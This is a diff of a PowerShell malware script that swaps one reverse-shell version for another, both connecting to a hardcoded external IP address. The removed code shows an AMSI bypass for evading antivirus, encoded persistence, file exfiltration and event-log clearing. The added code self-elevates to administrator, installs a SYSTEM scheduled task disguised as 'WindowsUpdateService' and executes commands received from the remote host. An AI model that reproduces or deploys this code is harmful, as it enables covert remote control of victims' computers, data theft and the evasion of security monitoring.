@@ -1,153 +1,61 @@
-# Enhanced Reverse Shell with SSL Encryption, Persistence and Stealth
-$serverIP = "147.185.221.31"  # UPDATE WITH YOUR SERVER IP
+# reverse_shell.ps1 - Persistent Admin Reverse Shell
+$serverIP = "147.185.221.31"  # ← UPDATE WITH YOUR ARCH IP
 $serverPort = 47034
-$maxRetryDelay = 300  # Maximum delay between connection attempts (5 minutes)
-$minRetryDelay = 10   # Minimum delay between connection attempts
+$reconnectDelay = 15
+$localPayloadPath = "$env:APPDATA\Microsoft\Windows\reverse_shell.ps1"
 
-# AMSI Bypass to evade antivirus detection
-[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+# Self-elevate to admin if not already
+if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
+    $arguments = "-ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Definition)`""
+    Start-Process powershell.exe -ArgumentList $arguments -Verb RunAs
+    exit
+}
+
+# Install persistent scheduled task if not exists
+$taskName = "WindowsUpdateService"
+if (-not (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue)) {
+    $trigger1 = New-ScheduledTaskTrigger -AtStartup
+    $trigger2 = New-ScheduledTaskTrigger -AtLogOn
+    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$localPayloadPath`""
+    Register-ScheduledTask -TaskName $taskName -Trigger @($trigger1, $trigger2) -Action $action -Principal $principal -Description "System Update Service" -Force
+}
 
 function Get-SystemInfo {
     $hostname = $env:COMPUTERNAME
     $username = $env:USERNAME
     $os = (Get-WmiObject Win32_OperatingSystem).Caption
-    $domain = (Get-WmiObject Win32_ComputerSystem).Domain
-    $ipAddress = (Test-Connection -ComputerName $env:COMPUTERNAME -Count 1).IPv4Address.IPAddressToString
-    return "SYSINFO:$hostname|$username|$os|$domain|$ipAddress"
+    return "SYSINFO:$hostname|$username|$os"
 }
 
-function Invoke-ExponentialBackoff {
-    param($retryCount)
-    $delay = [math]::Min($minRetryDelay * [math]::Pow(2, $retryCount), $maxRetryDelay)
-    $jitter = Get-Random -Minimum 0 -Maximum ($delay * 0.2)  # Add 20% jitter
-    return $delay + $jitter
-}
-
-function Install-Persistence {
-    $taskName = "WindowsUpdateService"
-    $taskExists = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
-    
-    if (-not $taskExists) {
-        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand $(ToBase64 $MyInvocation.MyCommand.ScriptContents)"
-        $trigger = New-ScheduledTaskTrigger -AtLogOn
-        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
-        $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
-        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings
-    }
-}
-
-function ToBase64 {
-    param($string)
-    $bytes = [System.Text.Encoding]::Unicode.GetBytes($string)
-    return [Convert]::ToBase64String($bytes)
-}
-
-function Invoke-SafeCommand {
-    param($command)
-    try {
-        # Use .NET methods instead of iex to avoid command logging
-        $scriptBlock = [ScriptBlock]::Create($command)
-        $result = $scriptBlock.Invoke() 2>&1 | Out-String
-    }
-    catch {
-        $result = "ERROR: $($_.Exception.Message)"
-    }
-    return $result
-}
-
-function Transfer-File {
-    param($direction, $path, $content = $null)
-    
-    try {
-        if ($direction -eq "upload" -and $content) {
-            $bytes = [Convert]::FromBase64String($content)
-            [System.IO.File]::WriteAllBytes($path, $bytes)
-            return "File uploaded successfully to $path"
-        }
-        elseif ($direction -eq "download" -and (Test-Path $path)) {
-            $bytes = [System.IO.File]::ReadAllBytes($path)
-            return [Convert]::ToBase64String($bytes)
-        }
-        else {
-            return "ERROR: File not found or invalid operation"
-        }
-    }
-    catch {
-        return "ERROR: $($_.Exception.Message)"
-    }
-}
-
-# Main execution
-$retryCount = 0
-Install-Persistence
-
+# Main persistent loop
 while ($true) {
     try {
         $client = New-Object System.Net.Sockets.TCPClient
         $client.Connect($serverIP, $serverPort)
         $stream = $client.GetStream()
-        
-        # Wrap with SSL stream for encryption
-        $sslStream = New-Object System.Net.Security.SslStream($stream, $false, 
-            { param($s, $c, $ch, $e) return $true })
-        $sslStream.AuthenticateAsClient($serverIP)
-        
-        $writer = New-Object System.IO.StreamWriter($sslStream)
+        $writer = New-Object System.IO.StreamWriter($stream)
         $writer.AutoFlush = $true
-        $reader = New-Object System.IO.StreamReader($sslStream)
-        
-        # Send system information
+        $reader = New-Object System.IO.StreamReader($stream)
         $writer.WriteLine((Get-SystemInfo))
-        $retryCount = 0  # Reset retry counter on successful connection
         
-        # Command execution loop
         while ($true) {
             try {
                 $command = $reader.ReadLine()
                 if (-not $command) { break }
-                
-                # Handle special commands
-                if ($command.StartsWith("download ")) {
-                    $filePath = $command.Substring(9)
-                    $result = Transfer-File "download" $filePath
-                    $writer.WriteLine($result)
-                }
-                elseif ($command.StartsWith("upload ")) {
-                    $parts = $command.Split(" ", 3)
-                    $filePath = $parts[1]
-                    $fileContent = $parts[2]
-                    $result = Transfer-File "upload" $filePath $fileContent
-                    $writer.WriteLine($result)
-                }
-                elseif ($command -eq "exit") { 
-                    break 
-                }
-                elseif ($command -eq "clear-log") {
-                    wevtutil cl "Windows PowerShell" 2>$null
-                    $result = " PowerShell event log cleared"
-                    $writer.WriteLine($result)
-                }
-                else {
-                    # Execute regular command
-                    $result = Invoke-SafeCommand $command
-                    $writer.WriteLine($result)
-                }
+                if ($command -eq "exit") { break }
+                $result = iex $command 2>&1 | Out-String
+                $writer.Write($result)
             }
             catch {
-                # Send error but keep connection alive
-                $writer.WriteLine("ERROR: $($_.Exception.Message)")
+                $errorOutput = "ERROR: $($_.Exception.Message)`n"
+                $writer.Write($errorOutput)
             }
         }
     }
-    catch {
-        # Connection failed, will retry
-    }
+    catch { }
     finally {
         if ($client) { $client.Close() }
     }
-    
-    # Wait with exponential backoff before reconnecting
-    $delay = Invoke-ExponentialBackoff $retryCount
-    Start-Sleep -Seconds $delay
-    $retryCount++
+    Start-Sleep -Seconds $reconnectDelay
 }
